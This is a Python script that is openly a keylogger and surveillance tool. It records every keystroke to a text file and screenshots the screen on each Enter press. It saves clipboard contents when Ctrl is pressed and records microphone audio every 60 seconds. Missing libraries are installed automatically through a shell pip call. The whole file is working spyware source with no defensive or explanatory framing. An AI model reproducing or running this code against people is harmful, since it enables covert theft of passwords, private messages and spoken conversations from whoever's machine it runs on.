

try:
    import os
    import pyperclip
    import pyautogui  # Library for taking screenshots
    import sounddevice as sd  # For recording audio
    import wave  # For saving the audio file
    from pynput import keyboard
    from datetime import datetime
    from threading import Timer
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyperclip", "pyautogui", "sounddevice", "wave", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)

# Audio recording parameters
SAMPLE_RATE = 16000  # Adjusted sample rate for better compatibility
DURATION = 10  # Duration of each audio recording in seconds

# List available audio devices to ensure correct device is selected
print(sd.query_devices())

# Optionally, set the correct audio device by name or index (replace 'Your_Microphone_Device_Name' or use index number)
# sd.default.device = 'Your_Microphone_Device_Name'  # Uncomment this line to manually set the device

def record_audio():
    """Record audio for a set duration and save it as a WAV file."""
    try:
        print("Recording audio...")
        audio_data = sd.rec(int(DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)  # Changed channels to 1 for mono
        sd.wait()  # Wait until recording is finished

        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        audio_filename = f"audio_{current_time}.wav"

        with wave.open(audio_filename, 'wb') as audio_file:
            audio_file.setnchannels(1)
            audio_file.setsampwidth(2)
            audio_file.setframerate(SAMPLE_RATE)
            audio_file.writeframes(audio_data.tobytes())

        print(f"Audio saved as {audio_filename}")
    except Exception as e:
        print(f"Failed to record audio: {e}")

def schedule_audio_recording(interval=60):
    """Schedule audio recordings to occur at regular intervals."""
    record_audio()  # Record immediately
    Timer(interval, schedule_audio_recording, [interval]).start()  # Schedule the next recording

def take_screenshot():
    """Capture a screenshot of the screen and save it with a timestamp."""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot = pyautogui.screenshot()
        screenshot.save(f"screenshot_{current_time}.png")
        print(f"Screenshot taken and saved as screenshot_{current_time}.png")
    except Exception as e:
        print(f"Failed to take screenshot: {e}")

def capture_clipboard():
    """Get the current clipboard content."""
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Failed to capture clipboard: {e}")
        return None

def log_data(key):
    """Log keystrokes to a file."""
    with open("keyfile.txt", 'a') as logkey:
        try:
            if hasattr(key, 'char'):
                logkey.write(key.char)
            else:
                logkey.write(f'[{key}]')
        except Exception as e:
            print(f"Error logging key: {e}")

def keyPressed(key):
    """Callback function for key presses."""
    print(str(key))
    log_data(key)

    # Take a screenshot after pressing Enter
    if key == keyboard.Key.enter:
        take_screenshot()

    # Capture clipboard contents when pressing Ctrl+L
    if key == keyboard.Key.ctrl_l:  # Change this to any other key combination if preferred
        clipboard_content = capture_clipboard()
        if clipboard_content:
            with open("clipboard.txt", 'a') as clipkey:
                clipkey.write(f"{clipboard_content}\n")
                print(f"Clipboard content captured: {clipboard_content}")

if __name__ == '__main__':
    # Start the keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Schedule regular audio recordings (every 60 seconds)
    schedule_audio_recording(interval=60)  # Change the interval as needed

    # Keep the program running
    input("Press Enter to stop logging.\n")
    listener.stop()
